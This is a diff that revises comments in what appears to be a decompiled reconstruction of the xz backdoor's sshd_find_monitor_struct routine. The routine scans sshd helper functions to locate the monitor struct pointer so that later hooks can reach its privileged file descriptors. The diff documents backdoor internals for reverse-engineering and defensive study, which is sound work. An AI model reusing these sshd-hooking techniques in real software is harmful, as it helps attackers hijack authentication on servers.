@@ -5,7 +5,7 @@
 
 
 /*
- * AutoDoc: Instruments the ten monitor-side helpers referenced in `string_refs` (allocation, channel handling, recv/send paths, etc.) by calling `sshd_find_monitor_field_addr_in_function` for each one. Every returned BSS address is tallied, and once a value shows up at least five times the routine records it in `ctx->struct_monitor_ptr_address` so later hooks can dereference monitor->monitor_to_child_fd/child_to_monitor_fd directly. The helper also emits a `secret_data_append_from_call_site` breadcrumb so the secret-data mirroring code knows when monitor discovery succeeded.
+ * AutoDoc: Instruments the ten monitor-side helpers referenced in `string_refs` (allocation, channel handling, recv/send paths, etc.) by calling `sshd_find_monitor_field_addr_in_function` for each one. Every returned `.data/.bss` slot is tallied, and once a value shows up at least five times the routine records it in `ctx->monitor_struct_slot` (`monitor **`) so later hooks can dereference the live `monitor *` and access `monitor_to_child_fd`/`child_to_monitor_fd`. The helper also emits a `secret_data_append_from_call_site` breadcrumb so the secret-data mirroring code knows when monitor discovery succeeded.
  */
 
 #include "xzre_types.h"
@@ -62,7 +62,7 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
         code_start = (u8 *)(&refs->xcalloc_zero_size)[monitor_vote_table[vote_idx]].func_start;
         if (code_start != (u8 *)0x0) {
           sshd_find_monitor_field_addr_in_function
-          // AutoDoc: Ask the helper to look for MOV [mem],reg stores and cache whatever monitor struct pointer those routines touch.
+          // AutoDoc: Ask the helper to look for MOV [mem],reg stores and cache the candidate `.bss` slot feeding `mm_request_send`.
                     (code_start,(u8 *)(&refs->xcalloc_zero_size)[monitor_vote_table[vote_idx]].func_end,
                      data_start,data_end,monitor_candidates + vote_idx,ctx);
         }
